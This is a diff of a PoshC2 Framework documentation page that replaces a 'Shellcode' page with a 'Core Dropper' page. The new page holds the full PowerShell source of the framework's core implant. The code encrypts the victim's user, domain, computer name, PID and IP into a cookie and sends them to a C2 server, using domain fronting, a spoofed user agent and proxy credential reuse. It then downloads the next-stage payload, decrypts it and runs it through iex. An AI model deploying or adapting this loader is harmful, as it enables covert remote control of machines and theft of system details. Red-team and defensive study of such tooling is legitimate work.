@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <title>Shellcode &mdash; PoshC2 Framework  documentation</title>
+  <title>Core Dropper &mdash; PoshC2 Framework  documentation</title>
   
 
   
@@ -37,8 +37,8 @@
         <link rel="search" title="Search" href="../search.html"/>
     <link rel="top" title="PoshC2 Framework  documentation" href="../index.html"/>
         <link rel="up" title="Execution / Payloads" href="index.html"/>
-        <link rel="next" title="PoshJS" href="poshjs.html"/>
-        <link rel="prev" title="Reflective Dll" href="dll.html"/> 
+        <link rel="next" title="Bat File" href="bat.html"/>
+        <link rel="prev" title="Execution / Payloads" href="index.html"/> 
 
   
   <script src="../_static/js/modernizr.min.js"></script>
@@ -90,7 +90,7 @@
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
-<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">Core Dropper</a></li>
 <li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
 <li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
 <li class="toctree-l2"><a class="reference internal" href="serviceexe.html">Service Executable</a></li>
@@ -100,7 +100,7 @@
 <li class="toctree-l2"><a class="reference internal" href="ms16-051.html">MS16-051 HTML File</a></li>
 <li class="toctree-l2"><a class="reference internal" href="java.html">Java Applet</a></li>
 <li class="toctree-l2"><a class="reference internal" href="dll.html">Reflective Dll</a></li>
-<li class="toctree-l2 current"><a class="current reference internal" href="#">Shellcode</a></li>
+<li class="toctree-l2"><a class="reference internal" href="shellcode.html">Shellcode</a></li>
 <li class="toctree-l2"><a class="reference internal" href="poshjs.html">PoshJS</a></li>
 <li class="toctree-l2"><a class="reference internal" href="sctfiles.html">SCT Files</a></li>
 <li class="toctree-l2"><a class="reference internal" href="proxy.html">CreateProxyPaylods</a></li>
@@ -158,13 +158,13 @@
         
           <li><a href="index.html">Execution / Payloads</a> &raquo;</li>
         
-      <li>Shellcode</li>
+      <li>Core Dropper</li>
     
     
       <li class="wy-breadcrumbs-aside">
         
             
-            <a href="../_sources/execution/shellcode.txt" rel="nofollow"> View page source</a>
+            <a href="../_sources/execution/core.txt" rel="nofollow"> View page source</a>
           
         
       </li>
@@ -177,8 +177,137 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
             
-  <div class="section" id="shellcode">
-<h1>Shellcode<a class="headerlink" href="#shellcode" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="core-dropper">
+<h1>Core Dropper<a class="headerlink" href="#core-dropper" title="Permalink to this headline">¶</a></h1>
+<p>The following code contains the core implant which is the basis for all droppers found in PoshC2:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>  # PoshC2 Server Url
+  $s=&quot;https://www.example.com&quot;
+
+  # creates a randon AES symetric encryption key
+  function CAM ($key,$IV){
+    $a = New-Object -TypeName &quot;System.Security.Cryptography.RijndaelManaged&quot;
+    $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    $a.BlockSize = 128
+    $a.KeySize = 256
+    if ($IV) {
+      if ($IV.getType().Name -eq &quot;String&quot;) {
+        $a.IV = [System.Convert]::FromBase64String($IV)
+      } else {
+        $a.IV = $IV
+      }
+    }
+    if ($key) {
+      if ($key.getType().Name -eq &quot;String&quot;) {
+        $a.Key = [System.Convert]::FromBase64String($key)
+      } else {
+        $a.Key = $key
+      }
+    }
+    $a
+  }
+
+  # encryption utility
+  function ENC ($key,$un) {
+    $b = [System.Text.Encoding]::UTF8.GetBytes($un)
+    $a = CAM $key
+    $e = $a.CreateEncryptor()
+    $f = $e.TransformFinalBlock($b, 0, $b.Length)
+    [byte[]] $p = $a.IV + $f
+    [System.Convert]::ToBase64String($p)
+  }
+
+  # decryption utility
+  function DEC ($key,$enc) {
+    $b = [System.Convert]::FromBase64String($enc)
+    $IV = $b[0..15]
+    $a = CAM $key $IV
+    $d = $a.CreateDecryptor()
+    $u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
+    [System.Text.Encoding]::UTF8.GetString($u)
+  }
+
+  # webclient function that handles all PoshC2 web requests
+  function Get-Webclient ($Cookie) {
+# only execute if the kill date has not passed
+    $d = (Get-Date -Format &quot;dd/MM/yyyy&quot;);
+    $d = [datetime]::ParseExact($d,&quot;dd/MM/yyyy&quot;,$null);
+    $k = [datetime]::ParseExact(&quot;&#39;+$killdatefm+&#39;&quot;,&quot;dd/MM/yyyy&quot;,$null);
+
+    if ($k -lt $d) {exit}
+
+    # proxy details if required
+    $username = &quot;&quot;
+    $password = &quot;&quot;
+    $proxyurl = &quot;&quot;
+
+    $wc = New-Object System.Net.WebClient;
+
+    # domain front header
+    $h=&quot;&quot;
+
+    if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {
+      $wc.Headers.Add(&quot;Host&quot;,$h)
+    } elseif($h) {
+      $script:s=&quot;https://$($h)/&#39;+$connect+&#39;&quot;
+    }
+
+    # add the useragent and referer header if required
+    $wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko&quot;)
+    $wc.Headers.Add(&quot;Referer&quot;,&quot;&quot;)
+
+# if there is proxy details setup the object
+    if ($proxyurl) {
+      $wp = New-Object System.Net.WebProxy($proxyurl,$true);
+
+      if ($username -and $password) {
+        $PSS = ConvertTo-SecureString $password -AsPlainText -Force;
+        $getcreds = new-object system.management.automation.PSCredential $username,$PSS;
+        $wp.Credentials = $getcreds;
+      } else {
+        $wc.UseDefaultCredentials = $true;
+      }
+
+      $wc.Proxy = $wp; } else {
+      $wc.UseDefaultCredentials = $true;
+      $wc.Proxy.Credentials = $wc.Credentials;
+    }
+
+    # if the request uses a cookie add here
+    if ($cookie) {
+    $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, &quot;SessionID=$Cookie&quot;)
+    }
+
+  # return the web request object
+  $wc
+
+  }
+
+  # primer function to get key values for new implant
+  function primer {
+    if ($env:username -eq &quot;$($env:computername)$&quot;) {
+      $u=&quot;NT AUTHORITY\SYSTEM&quot;
+    } else {
+      $u=$env:username
+    }
+    $o=&quot;$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;&#39;+$ipv4address+&#39;&quot;
+    $pp=enc -key &#39;+$enckey+&#39; -un $o
+    $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
+    dec -key &#39;+$enckey+&#39; -enc $primer
+  }
+
+  $primer = primer
+
+  # once the core implant has been downloaded sucessfully pass to IEX
+  if ($primer) {
+          $primer | iex
+  } else {
+  # else wait 120 seconds and try again
+          start-sleep 120
+          primer | iex
+  }
+</pre></div>
+</div>
 </div>
 
 
@@ -191,10 +320,10 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="poshjs.html" class="btn btn-neutral float-right" title="PoshJS" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="bat.html" class="btn btn-neutral float-right" title="Bat File" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
-        <a href="dll.html" class="btn btn-neutral" title="Reflective Dll" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+        <a href="index.html" class="btn btn-neutral" title="Execution / Payloads" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
       
     </div>
   
